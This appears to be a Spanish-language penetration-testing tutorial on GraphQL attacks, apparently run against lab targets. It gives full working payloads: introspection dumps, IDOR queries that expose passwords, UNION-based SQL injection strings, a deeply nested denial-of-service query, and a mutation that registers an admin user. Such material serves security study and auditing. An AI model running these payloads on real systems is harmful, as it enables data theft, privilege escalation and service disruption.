---
date: 2025-10-27T22:34:05.000Z
layout: post
comments: true
title: "GraphQL"
subtitle: 'Tipos de ataque'
description: >-
image: >-
  /images/graphqllogo.png
optimized_image: >-
  /images/graphqllogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - php
  - ssti
author: Felipe Canales Cayuqueo
paginate: true
---

GraphQL es un lenguaje de consulta para APIs que permite a los clientes obtener **exactamente** los datos que necesitan desde un único punto de acceso (habitualmente `/graphql`). A diferencia de REST, evita problemas como el *over-fetching* (cuando se reciben más datos de los necesarios) y el *under-fetching* (cuando se reciben menos y es necesario hacer múltiples solicitudes). En GraphQL, el cliente define qué campos y relaciones desea obtener, lo que hace las consultas más precisas y eficientes.

Este enfoque mejora el rendimiento y reduce el tráfico entre cliente y servidor. Además, GraphQL utiliza un esquema tipado que define los objetos y sus relaciones, y admite operaciones complejas como filtrado, subconsultas, actualizaciones y suscripciones. En conjunto, ofrece flexibilidad, eficiencia y un mayor control sobre los datos solicitados, siendo una alternativa moderna y más dinámica frente a las API REST tradicionales.

### Identificación del motor de GraphQL

Es posible identificar el motor de GraphQL con la herramienta [graphw00f](https://github.com/dolevf/graphw00f), la cual envía múltiples consultas para determinarlo.

```
┌──(root㉿nptg)-[/graphql]
└─# python3 main.py -d -f -t <website>
```

Se deben enumerar las consultas admitidas por el **esquema** de la API mediante la introspección (`Introspection`).

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

```graphql
{"query":"{__schema { types { name }}}"}
```

Ahora que conocemos un tipo, podemos obtener el nombre de todos los campos de ese tipo con la siguiente consulta:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

```graphql
"{ __type(name: \"UserObject\") { name fields { name type { name kind } } } }"
```

También podemos listar todas las consultas (queries) admitidas por el backend:

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

Conocer todas las consultas admitidas nos ayuda a identificar posibles vectores de ataque que podrían utilizarse para extraer información sensible. Por último, podemos ejecutar una consulta de introspección “general” que devuelve toda la información sobre tipos, campos y operaciones soportadas por el backend:

```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description

          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description

      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

El resultado de esta consulta suele ser extenso y complejo. Podemos visualizar el esquema de forma más amigable usando la herramienta [GraphQL-Voyager](https://github.com/APIs-guru/graphql-voyager); sigue las instrucciones del repositorio para cargar y explorar el esquema.


## Exploitación

### Divulgación de información

Con la información obtenida por introspección, revisemos el siguiente ejemplo ejecutando la consulta:

```graphql
{__schema { types { name }}}
```

[![graphql1](/images/graphql1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql1.png)

Tras esto detectamos una lista llamada `SecretObject` y procedemos a inspeccionarla:

```graphql
{ __type(name: "SecretObject") { name fields { name type { name kind } } } }
```

[![graphql2](/images/graphql2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql2.png)

La información encontrada puede consultarse así:

```graphql
{ secrets { id secret } }
```

[![graphql3](/images/graphql3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql3.png)


### Insecure Direct Object Reference (IDOR)

Para identificar problemas de autorización rota (IDOR), primero localizamos puntos de entrada que permitan acceder a recursos ajenos. Por ejemplo, mientras se navega en la web vulnerable se observó la petición:

[![graphql6](/images/graphql6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql6.png)

Podemos consultar los objetos y ver qué parámetros acepta la petición para intentar acceder a recursos adicionales.

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

[![graphql4](/images/graphql4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql4.png)

Luego buscamos definiciones del esquema que nos llamen la atención, por ejemplo `UserObject`:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

[![graphql5](/images/graphql5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql5.png)

Como se observa, en ciertos casos es posible solicitar el campo de contraseña:

[![graphql7](/images/graphql7.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql7.png)

[![graphql8](/images/graphql8.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql8.png)

También se puede enumerar todos los usuarios o iterar uno por uno:

```graphql
{users { id username msg role password}}
```

[![graphql9](/images/graphql9.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql9.png)

### Inyección SQL

Dado que GraphQL es un lenguaje de consulta, muchas implementaciones subyacen en bases de datos SQL; si el backend no valida correctamente la entrada, puede ser vulnerable a inyección SQL.

Una prueba rápida consiste en enviar una comilla simple:

[![graphql10](/images/graphql10.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql10.png)

[![graphql11](/images/graphql11.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql11.png)

Si se detecta vulnerabilidad, se puede construir una inyección basada en `UNION` para exfiltrar datos. Dado que GraphQL a menudo devuelve solo la primera fila, se usa `GROUP_CONCAT` para concatenar múltiples filas. Primero localizamos el número de columnas:

```graphql
' order by 6-- -
```

[![graphql12](/images/graphql12.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql12.png)

[![graphql13](/images/graphql13.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql13.png)

Si no hay error, probamos con 7:

```graphql
' order by 7-- -
```

Obtenemos un error que indica que hay 6 columnas:

[![graphql14](/images/graphql14.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql14.png)

[![graphql15](/images/graphql15.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql15.png)

Ahora construimos la consulta para enumerar los nombres de las tablas en la base de datos actual (usando un nombre de usuario inexistente):

```graphql
{"query":"{user(username: \"prueba' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database()-- -\") { id username msg role }}"}
```

[![graphql16](/images/graphql16.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql16.png)

[![graphql17](/images/graphql17.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql17.png)

Una vez tenemos las tablas, listamos las columnas de una tabla específica:

```graphql
{"query":"{user(username: \"prueba' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='flag' AND table_schema=database()-- -\") { id username msg role }}"}
```

[![graphql18](/images/graphql18.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql18.png)

[![graphql19](/images/graphql19.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql19.png)

Finalmente, extraemos el contenido:

```graphql
{"query":"{user(username: \"prueba' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM flag-- -\") { id username msg role }}"}
```

[![graphql20](/images/graphql20.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql20.png)

[![graphql21](/images/graphql21.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql21.png)


### Cross-Site Scripting (XSS)

Las implementaciones que reflejan contenido GraphQL en HTML sin desinfección pueden ser susceptibles a XSS; por ejemplo, si se muestran argumentos inválidos en mensajes de error:

[![graphql22](/images/graphql22.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql22.png)

[![graphql23](/images/graphql23.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql23.png)

### Denegación de servicio (DoS)

Consultas excesivamente profundas o grandes pueden sobrecargar el servidor y afectar la disponibilidad para otros usuarios.

> La consulta dependerá del caso específico.

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              posts {
                edges {
                  node {
                    author {
                      posts {
                        edges {
                          node {
                            author {
                              posts {
                                edges {
                                  node {
                                    author {
                                      posts {
                                        edges {
                                          node {
                                            author {
                                              posts {
                                                edges {
                                                  node {
                                                    author {
                                                      posts {
                                                        edges {
                                                          node {
                                                            author {
                                                              posts {
                                                                edges {
                                                                  node {
                                                                    author {
                                                                      username
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### Batching

El *batching* permite enviar múltiples consultas GraphQL en una sola solicitud HTTP (por ejemplo, enviando una lista JSON con varias consultas). Ejemplo:

```
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json

[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]
```

El *batching* no es en sí una vulnerabilidad, pero puede usarse para amplificar ataques (por ejemplo, fuerza bruta) si no se controlan límites de solicitud o se procesan consultas sensibles en lotes.

### Mutaciones

Las mutaciones son operaciones GraphQL que modifican datos en el servidor (crear, actualizar, eliminar). Identificamos las mutaciones soportadas por el backend y sus argumentos usando introspección:

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

A partir del resultado, podemos detectar mutaciones que permiten, por ejemplo, crear usuarios.

[![graphql24](/images/graphql24.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql24.png)

```graphql
{   
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

[![graphql25](/images/graphql25.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql25.png)

[![graphql26](/images/graphql26.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql26.png)

En un ejemplo real se identificó que la contraseña se almacenaba en MD5:

[![graphql27](/images/graphql27.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql27.png)

[![graphql28](/images/graphql28.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql28.png)

Generamos una contraseña y creamos el usuario:

```
┌──(root㉿nptg)-[/graphql]
└─# echo -n 'password' | md5sum
5f4dcc3b5aa765d61d8327deb882cf99
```

```graphql
mutation {
  registerUser(input: {username: "prueba", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

Como se observa, se asignó el rol de administrador.

[![graphql29](/images/graphql29.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql29.png)

[![graphql30](/images/graphql30.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql30.png)

Validamos que el usuario fue creado:

[![graphql31](/images/graphql31.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql31.png)

[![graphql32](/images/graphql32.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/graphql32.png)

Se consigue acceso al panel de administración.

> Herramientas recomendadas: para auditoría se sugiere [graphql-cop](https://github.com/dolevf/graphql-cop) y, como extensión para Burp Suite, [InQL](https://github.com/doyensec/inql).
